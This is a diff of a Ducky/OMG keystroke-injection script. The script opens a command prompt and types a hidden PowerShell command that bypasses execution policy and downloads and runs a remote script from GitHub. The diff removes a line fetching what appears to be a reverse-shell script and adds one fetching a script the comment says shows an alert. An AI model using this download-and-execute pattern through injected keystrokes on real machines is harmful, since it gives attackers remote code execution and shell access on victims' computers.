@@ -1,10 +1,10 @@
+REM OMG/Ducky Script to show powershell alert
 GUI r 
 DELAY 500
 STRING cmd.exe
 ENTER 
 DELAY 200
-STRING powershell -w h -NoP -NonI -Exec Bypass iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/bissgit/ps-scripts/main/psrevshell.ps1')
-ENTER
+STRING powershell -w h -Exec Bypass iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/bissgit/ps-scripts/main/alert.ps1')
 ENTER
 REM @@ Minimise
 DOWN
